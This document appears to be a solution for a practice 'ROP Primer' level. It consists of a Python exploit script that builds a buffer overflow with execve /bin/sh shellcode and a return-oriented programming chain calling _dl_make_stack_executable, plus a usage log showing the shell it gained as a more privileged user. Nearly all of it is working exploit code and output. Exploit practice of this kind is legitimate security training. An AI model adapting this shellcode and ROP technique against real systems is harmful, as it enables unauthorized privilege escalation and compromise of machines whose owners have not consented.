ROP Primer - level0 (warmup)

Second rop chain spawns a shell via the _dl_make_stack_executable based on ideas from http://hastebin.com/aqucuzimul.py

Usage:
level0@rop:~$ python ./level0.py > input
level0@rop:~$ cat input - | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, 1�R���>VxV4P�����-�^DpPj
                                                                         X�щ�j^̀�̀XXXX!J
id
uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
uname -a
Linux rop 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux



import struct

# execve /bin/sh
shell_code = "\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad" + "\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd" + "\x80\x96\xcd\x80"

# Fails EFAULT
# shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

output = shell_code
output += 'A' * (40 - len(shell_code))
output += 'XXXX'
output += struct.pack('I', 0x8084aba)           # pop eax, ebx, esi, edi, ret
output += '\x07\x00\x00\x00' + 'X'*8 + struct.pack('I', 0x080ca620)      # (3) move 7 into eax and __stackprot into edi
output += struct.pack('I', 0x8084ab8)           # mov [edi], eax; pop eax, ebx, esi, edi, ret
output += 'AAAA' + 'BBBB' + 'CCCC' + 'DDDD'
output += struct.pack('I', 0x8084aba)           # pop eax, ebx, esi, edi, ret
output += struct.pack('I', 0x80ca614)           # Address of __libc_stack_end
output += 'AAAA' + 'BBBB' + 'CCCC'
output += struct.pack('I', 0x80799f0)           # Address of _dl_make_stack_executable
# output += struct.pack('I', 0xbffff6d0)                # Address of shellcode (debug)
output += struct.pack('I', 0xbffff700)          # Address of shellcode (non debug)

# output += struct.pack('I', 0xbffff704)  + struct.pack('I', 0xbffff6e8) + 'DDDD' + 'EEEE'       # (3)
# output += struct.pack('I', 0x80799f0)
# output += 'BBBB' + 'CCCC' + 'DDDD' + 'EEEE' + 'FFFF' + struct.pack('I', 0xbffff6d0)    # (3)

print output